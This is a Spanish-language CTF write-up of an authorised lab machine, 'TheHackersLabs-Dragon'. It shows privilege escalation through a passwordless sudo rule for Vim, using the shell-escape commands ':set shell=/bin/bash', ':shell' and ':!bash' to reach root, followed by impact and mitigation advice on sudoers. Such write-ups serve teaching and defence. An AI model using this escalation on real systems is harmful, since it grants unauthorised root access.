Autor: OSWALDO

Tipo: CTF / Laboratorio autorizado
Objetivo: Escalada de privilegios usando sudo + Vim sin contraseña



## 1. Contexto

Durante la enumeración local del sistema se identificó que el usuario dragon tenía permisos sudo para ejecutar Vim como cualquier usuario sin requerir contraseña.

## 2. Enumeración

Comando ejecutado:

sudo -l

Evidencia encontrada:

User dragon may run the following commands on TheHackersLabs-Dragon:
    (ALL) NOPASSWD: /usr/bin/vim

Interpretación:
- (ALL): el comando puede ejecutarse como cualquier usuario, incluido root.
- NOPASSWD: no requiere contraseña.
- /usr/bin/vim: el binario permitido es Vim.

## 3. Explotación

Se ejecutó Vim con privilegios elevados:

sudo /usr/bin/vim

Dentro de Vim, se obtuvo una shell usando:

:set shell=/bin/bash
:shell

Alternativa:

:!bash

## 4. Verificación de privilegios

Después de abrir la shell, se verificaron los privilegios:

whoami
id

Resultado esperado:

root
uid=0(root) gid=0(root) groups=0(root)

Con esto se confirma la escalada de privilegios exitosa.

## 5. Impacto

El permiso sudo mal configurado permite al usuario dragon ejecutar Vim como root sin contraseña. Como Vim permite invocar comandos del sistema, el usuario puede obtener una shell con privilegios de root.

Impacto:
- Compromiso total del sistema.
- Lectura de archivos sensibles.
- Modificación de configuraciones críticas.
- Posible acceso a flags del CTF.

## 6. Mitigación

Recomendaciones:

1. Eliminar permisos sudo innecesarios sobre editores interactivos:
   - vim
   - nano
   - less
   - more
   - vi

2. Aplicar principio de mínimo privilegio.

3. Revisar /etc/sudoers y archivos dentro de /etc/sudoers.d/:

sudo visudo
sudo ls -la /etc/sudoers.d/

4. Evitar configuraciones como:

dragon ALL=(ALL) NOPASSWD: /usr/bin/vim

5. Usar comandos específicos y no binarios interactivos cuando sea necesario delegar tareas administrativas.
